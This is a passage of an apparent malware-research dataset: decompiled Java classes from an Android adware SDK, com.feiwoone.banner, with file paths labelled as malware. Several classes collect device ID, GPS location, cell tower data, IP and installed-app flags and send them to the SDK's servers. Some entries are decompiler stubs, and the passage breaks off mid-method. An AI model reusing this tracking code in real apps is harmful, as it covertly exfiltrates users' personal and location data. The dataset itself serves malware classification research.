"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner\h.code","public final class h extends TimerTask {   private b a;   public h(  b bVar){     this.a=bVar;   }   @Override public final void run(){     Handler handler;     handler=this.a.q;     handler.sendEmptyMessage(0);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner\i.code","public final class i implements com.feiwoone.banner.e.d {   private b a;   public i(  b bVar){     this.a=bVar;   }   @Override public final void a(  Drawable drawable){     ImageView imageView;     imageView=this.a.d;     imageView.setBackgroundDrawable(drawable);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner\j.code","public final class j extends TimerTask {   private b a;   public j(  b bVar){     this.a=bVar;   }   @Override public final void run(){     Handler handler;     handler=this.a.q;     handler.sendEmptyMessage(0);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner\k.code","public final class k implements LocationListener {   private static k a;   private Context b;   private double c;   private double d;   private k(  Context context){     this.b=context;   }   public static k a(  Context context){     if (a == null) {       a=new k(context);     }     return a;   }   private void a(  AdBanner adBanner,  Handler handler,  com.feiwoone.banner.c.a aVar){     handler.post(new n(this,adBanner,aVar));   }   public static void a(  k kVar,  AdBanner adBanner,  int i,  com.feiwoone.banner.c.a aVar,  String str){     try {       Context context=kVar.b;       double d=kVar.c;       double d2=kVar.d;       String appKey=adBanner.getAppKey();       String a2=com.feiwoone.banner.f.k.a(context);       String c=com.feiwoone.banner.f.a.a(context).c();       String d3=com.feiwoone.banner.f.a.a(context).d();       String b=com.feiwoone.banner.f.a.a(context).b();       String a3=com.feiwoone.banner.f.a.a(context).a();       JSONObject jSONObject=new JSONObject();       jSONObject.put(""devid"",a2);       jSONObject.put(""adid"",aVar.i());       jSONObject.put(""appkey"",appKey);       jSONObject.put(""type"",i);       jSONObject.put(""lat"",d);       jSONObject.put(""lon"",d2);       jSONObject.put(""cellid"",c);       jSONObject.put(""lac"",d3);       jSONObject.put(""mcc"",a3);       jSONObject.put(""mnc"",b);       jSONObject.put(""url"",str);       jSONObject.put(""adsdkversion"",""2.6"");       jSONObject.put(""sdktype"",""BANNER"");       new StringBuilder(""click json "").append(jSONObject.toString());       com.feiwoone.banner.f.h.a().a(kVar.b,jSONObject.toString(),com.feiwoone.banner.f.b.b(),adBanner.getAppKey());     }  catch (    ParseException e) {     } catch (    JSONException e2) {     } catch (    Exception e3) {     }   }   public static void a(  k kVar,  AdBanner adBanner,  Handler handler){     JSONArray jSONArray;     com.feiwoone.banner.f.e.b(kVar.b,""ADFEIWO"",""APPKEY"",adBanner.getAppKey(),""12345678"");     try {       Context context=kVar.b;       double d=kVar.c;       double d2=kVar.d;       String appKey=adBanner.getAppKey();       String a2=com.feiwoone.banner.f.k.a(context);       String b=com.feiwoone.banner.f.k.b(context);       String c=com.feiwoone.banner.f.k.c(context);       String a3=com.feiwoone.banner.f.k.a();       String b2=com.feiwoone.banner.f.k.b();       int i=com.feiwoone.banner.b.a.b;       int i2=com.feiwoone.banner.b.a.c;       if (i <= 0 || i2 <= 0) {         com.feiwoone.banner.c.c d3=com.feiwoone.banner.f.k.d(context);         i=d3.a();         i2=d3.b();       }       String c2=com.feiwoone.banner.f.a.a(context).c();       String d4=com.feiwoone.banner.f.a.a(context).d();       String b3=com.feiwoone.banner.f.a.a(context).b();       String a4=com.feiwoone.banner.f.a.a(context).a();       JSONObject jSONObject=new JSONObject();       jSONObject.put(""os"",""Android"");       jSONObject.put(""devid"",a2);       jSONObject.put(""appkey"",appKey);       jSONObject.put(""lat"",d);       jSONObject.put(""lon"",d2);       jSONObject.put(""wifi"",b);       jSONObject.put(""ip"",c);       jSONObject.put(""direction"","""");       jSONObject.put(""sound"","""");       jSONObject.put(""keyword"","""");       jSONObject.put(""width"",String.valueOf(i));       jSONObject.put(""height"",String.valueOf(i2));       jSONObject.put(""deviceosversion"",b2);       jSONObject.put(""mcc"",a4);       jSONObject.put(""mnc"",b3);       jSONObject.put(""version"",""2.6"");       jSONObject.put(""adsdkversion"",""2.6"");       jSONObject.put(""devicename"",a3);       jSONObject.put(""sdkname"",""Android"");       jSONObject.put(""cellid"",c2);       jSONObject.put(""lac"",d4);       com.feiwoone.banner.f.i.a();       jSONObject.put(""weixinflag"",com.feiwoone.banner.f.i.a(context,""com.tencent.mm""));       jSONObject.put(""adsdk"",""4.0"");       jSONObject.put(""sdktype"",""BANNER"");       new StringBuilder(""json "").append(jSONObject.toString());       jSONArray=new JSONArray(com.feiwoone.banner.f.h.a().a(kVar.b,jSONObject.toString(),com.feiwoone.banner.f.b.a(),adBanner.getAppKey()));       new StringBuilder("" return json "").append(jSONArray.toString());     }  catch (    IllegalStateException e) {       kVar.a(adBanner,handler,(com.feiwoone.banner.c.a)null);     } catch (    ParseException e2) {       kVar.a(adBanner,handler,(com.feiwoone.banner.c.a)null);     } catch (    JSONException e3) {       kVar.a(adBanner,handler,(com.feiwoone.banner.c.a)null);     } catch (    Exception e4) {       kVar.a(adBanner,handler,(com.feiwoone.banner.c.a)null);     }     if (jSONArray.length() > 0) {       Context context2=kVar.b;       com.feiwoone.banner.c.a aVar=new com.feiwoone.banner.c.a(jSONArray.optJSONObject(0));       com.feiwoone.banner.f.e.a(kVar.b,""ADFEIWO"",""list_click"",new StringBuilder(String.valueOf(aVar.i())).toString(),0);       if (com.feiwoone.banner.e.f.a(kVar.b).a(""/adfeiwo/image/"",aVar.d())) {         kVar.a(adBanner,handler,aVar);         return;       }  else {         kVar.a(adBanner,handler,(com.feiwoone.banner.c.a)null);         return;       }     }     kVar.a(adBanner,handler,(com.feiwoone.banner.c.a)null);     Context context3=kVar.b;     if (context3.getSharedPreferences(""ADFEIWO"",0).getBoolean(com.feiwoone.banner.f.f.a(""FIRST_USER"",""12345678"",true),true)) {       com.feiwoone.banner.e.m a5=com.feiwoone.banner.e.m.a();       String jSONObject2=com.feiwoone.banner.f.a.a(kVar.b,adBanner.getAppKey(),""2.6"").toString();       com.feiwoone.banner.e.o oVar=new com.feiwoone.banner.e.o();       oVar.a(kVar.b,com.feiwoone.banner.f.b.c(),adBanner.getAppKey(),jSONObject2);       oVar.a(new m(kVar));       a5.a(oVar);     }   }   public final void a(  AdBanner adBanner,  int i,  com.feiwoone.banner.c.a aVar,  String str){     new Thread(new o(this,aVar,adBanner,i,str)).start();   }   public final void a(  AdBanner adBanner,  Handler handler){     new Thread(new l(this,adBanner,handler)).start();   }   @Override public final void onLocationChanged(  Location location){     this.c=location.getLatitude();     this.d=location.getLongitude();   }   @Override public final void onProviderDisabled(  String str){   }   @Override public final void onProviderEnabled(  String str){   }   @Override public final void onStatusChanged(  String str,  int i,  Bundle bundle){   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner\l.code","public final class l implements Runnable {   private k a;   private final AdBanner b;   private final Handler c;   public l(  k kVar,  AdBanner adBanner,  Handler handler){     this.a=kVar;     this.b=adBanner;     this.c=handler;   }   @Override public final void run(){     k kVar;     kVar=k.a; synchronized (kVar) {       k.a(this.a,this.b,this.c);     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner\m.code","public final class m implements com.feiwoone.banner.e.n {   private k a;   public m(  k kVar){     this.a=kVar;   }   @Override public final void a(  boolean z,  String str){     Context context;     Context context2;     if (str == null || !z) {       context=this.a.b;       com.feiwoone.banner.f.e.a(context,""ADFEIWO"",""FIRST_USER"",true,""12345678"");     }  else {       context2=this.a.b;       com.feiwoone.banner.f.e.a(context2,""ADFEIWO"",""FIRST_USER"",false,""12345678"");     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner\n.code","public final class n implements Runnable {   private final AdBanner a;   private final com.feiwoone.banner.c.a b;   public n(  k kVar,  AdBanner adBanner,  com.feiwoone.banner.c.a aVar){     this.a=adBanner;     this.b=aVar;   }   @Override public final void run(){     this.a.a(this.b);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner\o.code","public final class o implements Runnable {   private k a;   private final com.feiwoone.banner.c.a b;   private final AdBanner c;   private final int d;   private final String e;   public o(  k kVar,  com.feiwoone.banner.c.a aVar,  AdBanner adBanner,  int i,  String str){     this.a=kVar;     this.b=aVar;     this.c=adBanner;     this.d=i;     this.e=str;   }   @Override public final void run(){     k kVar;     Context context;     Context context2;     kVar=k.a; synchronized (kVar) {       context=this.a.b;       int a=com.feiwoone.banner.f.e.a(context,""ADFEIWO"",""list_click"",new StringBuilder(String.valueOf(this.b.i())).toString(),0);       context2=this.a.b;       String sb=new StringBuilder().append(this.b.i()).toString();       String sb2=new StringBuilder(String.valueOf(a + 1)).toString();       JSONObject b=com.feiwoone.banner.f.e.b(context2,""ADFEIWO"",""list_click"");       try {         b.put(sb,sb2);       }  catch (      JSONException e) {         System.out.println("">> error "" + e.getMessage());       }       com.feiwoone.banner.f.e.b(context2,""ADFEIWO"",""list_click"",b.toString(),""12345678"");       k.a(this.a,this.c,this.d,this.b,this.e);     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner\p.code","final class p implements Runnable {   private AdReceiver a;   private final Context b;   private final String c;   private final String d;   private final JSONObject e;   public p(  AdReceiver adReceiver,  Context context,  String str,  String str2,  JSONObject jSONObject){     this.a=adReceiver;     this.b=context;     this.c=str;     this.d=str2;     this.e=jSONObject;   }   @Override public final void run(){     com.feiwoone.banner.f.e.a(this.b,this.c,""12345678"");     com.feiwoone.banner.e.m a=com.feiwoone.banner.e.m.a();     com.feiwoone.banner.e.o oVar=new com.feiwoone.banner.e.o();     oVar.a(this.b,com.feiwoone.banner.f.b.d(),this.d,this.e.toString());     oVar.a(new q(this,this.b,this.e));     a.a(oVar);     this.a.a.removeCallbacks(this);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner\q.code","final class q implements com.feiwoone.banner.e.n {   private final Context a;   private final JSONObject b;   public q(  p pVar,  Context context,  JSONObject jSONObject){     this.a=context;     this.b=jSONObject;   }   @Override public final void a(  boolean z,  String str){     if (str == null || !z) {       com.feiwoone.banner.f.e.b(this.a,""ADFEIWO"",""list_install"",this.b.toString(),""12345678"");     }  else {       com.feiwoone.banner.f.e.b(this.a,""ADFEIWO"",""list_install"",new JSONObject().toString(),""12345678"");     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner\RecevieAdListener.code","public interface RecevieAdListener {   void onFailedToRecevieAd(  AdBanner adBanner);   void onSucessedRecevieAd(  AdBanner adBanner); } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner\WebViewActivity.code","!org.eclipse.jdt.core.dom.TypeDeclaration@7ef9d004"
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.a\a.code","public class a {   public Bitmap a;   public int b;   public a c;   public a(){   }   public a(  Bitmap bitmap,  int i){     this.c=null;     this.a=bitmap;     this.b=i;   }   public static void a(  View view){     AnimationSet animationSet=new AnimationSet(true);     animationSet.addAnimation(new ScaleAnimation(0.0f,1.0f,0.0f,1.0f,0.5f,0.5f));     animationSet.setDuration(2000L);     animationSet.setFillEnabled(false);     animationSet.setAnimationListener(new b());     view.startAnimation(animationSet);   }   public static void b(  View view){     AnimationSet animationSet=new AnimationSet(true);     animationSet.addAnimation(new ScaleAnimation(0.0f,1.0f,0.0f,1.0f,1,0.5f,1,0.5f));     animationSet.addAnimation(new AlphaAnimation(0.0f,1.0f));     animationSet.setInterpolator(new AccelerateDecelerateInterpolator());     animationSet.setDuration(2000L);     view.startAnimation(animationSet);   }   public static void c(  View view){     AlphaAnimation alphaAnimation=new AlphaAnimation(0.0f,1.0f);     alphaAnimation.setDuration(2000L);     alphaAnimation.setFillEnabled(true);     alphaAnimation.setAnimationListener(new c());     view.startAnimation(alphaAnimation);   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.a\b.code","final class b implements Animation.AnimationListener {   @Override public final void onAnimationEnd(  Animation animation){   }   @Override public final void onAnimationRepeat(  Animation animation){   }   @Override public final void onAnimationStart(  Animation animation){   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.a\c.code","final class c implements Animation.AnimationListener {   @Override public final void onAnimationEnd(  Animation animation){   }   @Override public final void onAnimationRepeat(  Animation animation){   }   @Override public final void onAnimationStart(  Animation animation){   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.b\a.code","public final class a {   public static int a;   public static int b=0;   public static int c=0;   public static final String d=""b_feiwo_downloading_placeholder"".replace(""_placeholder"",""""); } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.c\a.code","public final class a implements Serializable {   private String a;   private ArrayList b;   private int c;   private int d;   private int e;   private ArrayList f;   private int g;   private int h;   private double i;   private double j;   private int k;   private String l;   private String m;   private String n;   private Boolean o;   private boolean p;   private boolean q;   public a(){     this.l="""";   }   public a(  JSONObject jSONObject){     this.l="""";     try {       if (jSONObject.has(""image"")) {         this.a=jSONObject.getString(""image"");       }       if (jSONObject.has(""text"")) {         JSONArray jSONArray=jSONObject.getJSONArray(""text"");         if (this.b == null) {           this.b=new ArrayList();         }  else {           this.b.clear();         }         for (int i=0; i < jSONArray.length(); i++) {           this.b.add(jSONArray.optString(i));         }       }       this.c=jSONObject.getInt(""adid"");       this.d=jSONObject.getInt(""showtype"");       this.e=jSONObject.getInt(""clicktype"");       JSONArray jSONArray2=jSONObject.getJSONArray(""typevalue"");       for (int i2=0; i2 < jSONArray2.length(); i2++) {         if (this.f == null) {           this.f=new ArrayList();         }         this.f.add(jSONArray2.optString(i2));       }       if (jSONObject.has(""width"")) {         this.g=jSONObject.getInt(""width"");       }       if (jSONObject.has(""height"")) {         this.h=jSONObject.getInt(""height"");       }       if (jSONObject.has(""lat"")) {         this.i=jSONObject.getDouble(""lat"");       }       if (jSONObject.has(""lon"")) {         this.j=jSONObject.getDouble(""lon"");       }       if (jSONObject.has(""pushstring"")) {         this.l=jSONObject.getString(""pushstring"");       }       if (jSONObject.has(""pushstringdesc"")) {         jSONObject.getString(""pushstringdesc"");       }       if (jSONObject.has(""pushimage"")) {         jSONObject.getString(""pushimage"");       }       this.k=jSONObject.getInt(""refreshtime"");       if (jSONObject.has(""distance"")) {         jSONObject.getInt(""distance"");       }       if (jSONObject.has(""isclick"")) {         this.o=Boolean.valueOf(jSONObject.getBoolean(""isclick""));       }       if (!jSONObject.has(""wapurl"") || jSONObject.optString(""wapurl"") == null) {         this.m=null;       }  else {         this.m=jSONObject.optString(""wapurl"");       }       if (jSONObject.has(""packagename"")) {         this.n=jSONObject.optString(""packagename"");       }       jSONObject.optInt(""clickcount"",3);       this.p=""true"".equals(jSONObject.optString(""notifiKeep"",""false"").trim());       this.q=""true"".equals(jSONObject.optString(""gprsDown"",""false"").trim());     }  catch (    JSONException e) {     }   }   public final Boolean a(){     return this.o;   }   public final void a(  int i){     this.k=i;   }   public final String b(){     return this.l;   }   public final String c(){     return this.m;   }   public final String d(){     return this.a;   }   public final ArrayList e(){     return this.b;   }   public final int f(){     return this.d;   }   public final int g(){     return this.e;   }   public final ArrayList h(){     return this.f;   }   public final int i(){     return this.c;   }   public final int j(){     return this.g;   }   public final int k(){     return this.h;   }   public final double l(){     return this.i;   }   public final double m(){     return this.j;   }   public final int n(){     return this.k;   }   public final String o(){     return this.n;   }   public final boolean p(){     return this.p;   }   public final boolean q(){     return this.q;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.c\b.code","public final class b implements Serializable {   private int a;   private String b;   private String c;   private String d;   private String e;   private boolean f;   public b(){   }   public b(  int i,  String str,  String str2,  String str3,  String str4,  boolean z){     this.a=i;     this.e=str;     this.b=null;     this.c=str3;     this.d=str4;     this.f=z;   }   public final int a(){     return this.a;   }   public final void a(  int i){   }   public final void a(  long j){   }   public final String b(){     return this.d;   }   public final void b(  long j){   }   public final String c(){     return this.b;   }   public final String d(){     return this.c;   }   public final boolean e(){     return this.f;   }   public final String f(){     return this.e;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.c\c.code","public final class c {   private int a=0;   private int b=0;   public final int a(){     return this.a;   }   public final void a(  int i){     this.a=i;   }   public final int b(){     return this.b;   }   public final void b(  int i){     this.b=i;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.d\a.code","public interface a {   void a(  boolean z,  int i); } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.d\b.code","public final class b extends Thread {   private int H;   private short[] I;   private byte[] J;   private byte[] K;   private byte[] L;   private com.feiwoone.banner.a.a M;   private int N;   private a O;   public int a;   public int b;   private InputStream c;   private int d;   private boolean e;   private int f;   private int[] g;   private int[] h;   private int[] i;   private int j;   private int k;   private int l;   private boolean m;   private boolean n;   private int o;   private int p;   private int q;   private int r;   private int s;   private int t;   private int u;   private int v;   private int w;   private Bitmap x;   private Bitmap y;   private com.feiwoone.banner.a.a z=null;   private boolean A=false;   private byte[] B=new byte[IController.START_VALUE];   private int C=0;   private int D=0;   private int E=0;   private boolean F=false;   private int G=0;   private byte[] P=null;   public b(  InputStream inputStream,  a aVar){     this.O=null;     this.c=inputStream;     this.O=aVar;   }   private Bitmap a(  int i){     com.feiwoone.banner.a.a aVar=this.M;     int i2=0;     while (true) {       if (aVar != null) {         if (i2 == i) {           break;         }         i2++;         aVar=aVar.c;       }  else {         aVar=null;         break;       }     }     if (aVar == null) {       return null;     }     return aVar.a;   }   private int[] b(  int i){     int i2;     int i3=0;     int i4=i * 3;     int[] iArr=null;     byte[] bArr=new byte[i4];     try {       i2=this.c.read(bArr);     }  catch (    Exception e) {       i2=0;     }     if (i2 < i4) {       this.d=1;     }  else {       iArr=new int[IController.START_VALUE];       for (int i5=0; i5 < i; i5++) {         int i6=i3 + 1;         int i7=i6 + 1;         i3=i7 + 1;         iArr[i5]=((bArr[i3] & 255) << 16) | (-16777216) | ((bArr[i6] & 255) << 8)| (bArr[i7] & 255);       }     }     return iArr;   }   private int e(){     this.d=0;     this.N=0;     this.M=null;     this.g=null;     this.h=null;     if (this.c != null) {       String str="""";       for (int i=0; i < 6; i++) {         str=String.valueOf(str) + ((char)g());       }       if (str.startsWith(""GIF"")) {         this.a=k();         this.b=k();         int g=g();         this.e=(g & 128) != 0;         this.f=2 << (g & 7);         this.j=g();         g();         if (this.e && !f()) {           this.g=b(this.f);           this.k=this.g[this.j];         }       }  else {         this.d=1;       }       if (!f()) {         i();         if (this.N < 0) {           this.d=1;           this.O.a(false,-1);         }  else {           this.d=-1;           this.O.a(true,-1);         }       }       try {         this.c.close();       }  catch (      Exception e) {       }     }  else {       this.d=2;       this.O.a(false,-1);     }     return this.d;   }   private boolean f(){     return this.d != 0;   }   private int g(){     try {       return this.c.read();     }  catch (    Exception e) {       this.d=1;       return 0;     }   }   private int h(){     this.C=g();     int i=0;     if (this.C > 0) {       while (i < this.C) {         try {           int read=this.c.read(this.B,i,this.C - i);           if (read == -1) {             break;           }           i+=read;         }  catch (        Exception e) {         }       }       if (i < this.C) {         this.d=1;       }     }     return i;   }   private void i(){     throw new UnsupportedOperationException(""Method not decompiled: com.feiwoone.banner.d.b.i():void"");   }   private void j(){     do {       h();       if (this.B[0] == 1) {         byte[] bArr=this.B;         byte[] bArr2=this.B;       }       if (this.C <= 0) {         return;       }     }  while (!f());   }   private int k(){     return g() | (g() << 8);   }   private void l(){     do {       h();       if (this.C <= 0) {         return;       }     }  while (!f());   }   public final void a(){     com.feiwoone.banner.a.a aVar=this.M;     while (aVar != null) {       aVar.a=null;       this.M=this.M.c;       aVar=this.M;     }     if (this.c != null) {       try {         this.c.close();       }  catch (      Exception e) {       }       this.c=null;     }     this.P=null;   }   public final int b(){     return this.N;   }   public final Bitmap c(){     return a(0);   }   public final com.feiwoone.banner.a.a d(){     if (!this.A) {       this.A=true;       return this.M;     }     if (this.d != 0) {       this.z=this.z.c;       if (this.z == null) {         this.z=this.M;       }     }  else     if (this.z.c != null) {       this.z=this.z.c;     }     return this.z;   }   @Override public final void run(){     if (this.c != null) {       e();     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.d\c.code","!org.eclipse.jdt.core.dom.TypeDeclaration@197c3101"
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.d\d.code","final class d extends Handler {   private c a;   public d(  c cVar){     this.a=cVar;   }   @Override public final void handleMessage(  Message message){     this.a.invalidate();   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.d\e.code","final class e extends Thread {   private c a;   public e(  c cVar){     this(cVar,(byte)0);   }   private e(  c cVar,  byte b){     this.a=cVar;   }   @Override public final void run(){     if (c.a(this.a) == null) {       return;     }     while (c.b(this.a)) {       if (c.c(this.a)) {         SystemClock.sleep(10L);       }  else {         com.feiwoone.banner.a.a d=c.a(this.a).d();         c.a(this.a,d.a);         long j=d.b;         if (c.d(this.a) == null) {           return;         }         c.d(this.a).sendMessage(c.d(this.a).obtainMessage());         SystemClock.sleep(j);       }     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.e\a.code","public final class a {   private static a a=null;   private ExecutorService b;   private f c;   private Map d=new HashMap();   private a(){     this.b=null;     this.b=Executors.newFixedThreadPool(5);     new ConcurrentLinkedQueue();   }   public static a a(){     if (a == null) {       a=new a();     }     return a;   }   public final Drawable a(  Context context,  String str,  d dVar){     if (this.c == null) {       this.c=f.a(context);     }     if (this.d.containsKey(str)) {       SoftReference softReference=(SoftReference)this.d.get(str);       if (softReference.get() != null) {         dVar.a((Drawable)softReference.get());         return (Drawable)softReference.get();       }     }     this.b.submit(new c(this,context,str,new b(this,dVar,str)));     return null;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.e\b.code","final class b extends Handler {   private final d a;   private final String b;   public b(  a aVar,  d dVar,  String str){     this.a=dVar;     this.b=str;   }   @Override public final void handleMessage(  Message message){     if (message.obj != null) {       d dVar=this.a;       Drawable drawable=(Drawable)message.obj;       String str=this.b;       dVar.a(drawable);     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.e\c.code","public final class c implements Runnable {   private a a;   private final Context b;   private final String c;   private final Handler d;   public c(  a aVar,  Context context,  String str,  Handler handler){     this.a=aVar;     this.b=context;     this.c=str;     this.d=handler;   }   @Override public final void run(){     Map map;     Drawable a=f.a(this.b,this.c);     if (a == null) {       try {         Thread.sleep(500L);       }  catch (      InterruptedException e) {       }       a=f.a(this.b,this.c);     }     if (a != null) {       map=this.a.d;       map.put(this.c,new SoftReference(a));       this.d.sendMessage(this.d.obtainMessage(0,a));     }   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.e\d.code","public interface d {   void a(  Drawable drawable); } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.e\e.code","public class e implements l {   public e(){   }   public e(  g gVar){   }   public static int a(  Context context){     ConnectivityManager connectivityManager=(ConnectivityManager)context.getSystemService(""connectivity"");     if (connectivityManager == null) {       return 0;     }     NetworkInfo[] allNetworkInfo=connectivityManager.getAllNetworkInfo();     if (allNetworkInfo != null) {       int length=allNetworkInfo.length;       for (int i=0; i < length; i++) {         if (allNetworkInfo[i].getState() == NetworkInfo.State.CONNECTED) {           if (allNetworkInfo[i].getTypeName().equalsIgnoreCase(""MOBILE"")) {             return (Proxy.getDefaultHost() == null || Proxy.getDefaultHost().equals("""")) ? 11 : 12;           }           return 10;         }       }     }     return 0;   } } "
"msc_data/decompiled_malware_class/000BCFCB3991FE71555AE7D923C6AC59073626AFFFCC9DADDC7B73C0FED8046A\com.feiwoone.banner.e\f.code","public class f {   private static f b;   private Context a;   public f(){   }   public f(  Context context){     this.a=context;   }   public static Drawable a(  Context context,  String str){     HttpURLConnection httpURLConnection;     InputStream inputStream;     ByteArrayOutputStream byteArrayOutputStream;     BufferedInputStream bufferedInputStream;     ByteArrayOutputStream byteArrayOutputStream2;     BufferedInputStream bufferedInputStream2;     Drawable drawable;     BufferedInputStream bufferedInputStream3=null;     try {       try {         URL url=new URL(str);         httpURLConnection=e.a(context) == 12 ? (HttpURLConnection)url.openConnection(new Proxy(Proxy.Type.HTTP,new InetSocketAddress(android.net.Proxy.getDefaultHost(),android.net.Proxy.getDefaultPort()))) : (HttpURLConnection)url.openConnection();         try {           httpURLConnection.setConnectTimeout(10000);           httpURLConnection.setReadTimeout(10000);           httpURLConnection.setRequestMethod(""GET"");           httpURLConnection.connect();           inputStream=httpURLConnection.getInputStream();         }  catch (        Exception e) {           e=e;           bufferedInputStream=null;           inputStream=null;           byteArrayOutputStream2=null;         } catch (        OutOfMemoryError e2) {           bufferedInputStream=null;           inputStream=null;           byteArrayOutputStream2=null;         } catch (        Throwable th) {           th=th;           inputStream=null;           byteArrayOutputStream=null;         }       }  catch (      Throwable th2) {         th=th2;         bufferedInputStream3=bufferedInputStream2;       }     }  catch (    Exception e3) {       e=e3;       httpURLConnection=null;       bufferedInputStream=null;       inputStream=null;       byteArrayOutputStream2=null;     } catch (    OutOfMemoryError e4) {       httpURLConnection=null;       bufferedInputStream=null;       inputStream=null;       byteArrayOutputStream2=null;     } catch (    Throwable th3) {       th=th3;       httpURLConnection=null;       inputStream=null;       byteArrayOutputStream=null;     }     if (inputStream == null) {       if (inputStream != null) {         try {           inputStream.close();         }  catch (        IOException e5) {         }       }       httpURLConnection.disconnect();       return null;     }     try {       bufferedInputStream=new BufferedInputStream(inputStream,IController.X_VALUE);     }  catch (    Exception e6) {       e=e6;       bufferedInputStream=null;       byteArrayOutputStream2=null;     } catch (    OutOfMemoryError e7) {       bufferedInputStream=null;       byteArrayOutputStream2=null;     } catch (    Throwable th4) {       th=th4;       byteArrayOutputStream=null;     }     try {       byteArrayOutputStream2=new ByteArrayOutputStream(IController.X_VALUE);       try {         byte[] bArr=new byte[IController.X_VALUE];         for (int read=bufferedInputStream.read(bArr); read != -1; read=bufferedInputStream.read(bArr)) {           byteArrayOutputStream2.write(bArr,0,read);         }         drawable=Drawable.createFromStream(new ByteArrayInputStream(byteArrayOutputStream2.toByteArray()),""src"");         try {           byteArrayOutputStream2.close();         }  catch (        IOException e8) {         }         try {           bufferedInputStream.close();         }  catch (        IOException e9) {         }         if (inputStream != null) {           try {             inputStream.close();           }  catch (          IOException e10) {           }         }         httpURLConnection.disconnect();       }  catch (      Exception e11) {         e=e11;         new StringBuilder(""error > "").append(e.getMessage());         if (byteArrayOutputStream2 != null) {           try {             byteArrayOutputStream2.close();           }  catch (          IOException e12) {           }         }         if (bufferedInputStream != null) {           try {             bufferedInputStream.close();           }  catch (          IOException e13) {           }         }         if (inputStream != null) {           try {             inputStream.close();           }  catch (          IOException e14) {           }         }         httpURLConnection.disconnect();         drawable=null;         return drawable;       } catch (      OutOfMemoryError e15) {         if (byteArrayOutputStream2 != null) {           try {             byteArrayOutputStream2.close();           }  catch (          IOException e16) {           }         }         if (bufferedInputStream != null) {           try {             bufferedInputStream.close();           }  catch (          IOException e17) {           }         }         if (inputStream != null) {           try {             inputStream.close();           }  catch (          IOException e18) {           }         }         httpURLConnection.disconnect();         drawable=null;         return drawable;       }     }  catch (    Exception e19) {       e=e19;       byteArrayOutputStream2=null;     } catch (    OutOfMemoryError e20) {       byteArrayOutputStream2=null;     } catch (    Throwable th5) {       th=th5;       byteArrayOutputStream=null;       bufferedInputStream3=bufferedInputStream;       if (byteArrayOutputStream != null) {         try {           byteArrayOutputStream.close();         }  catch (        IOException e21) {         }       }       if (bufferedInputStream3 != null) {         try {           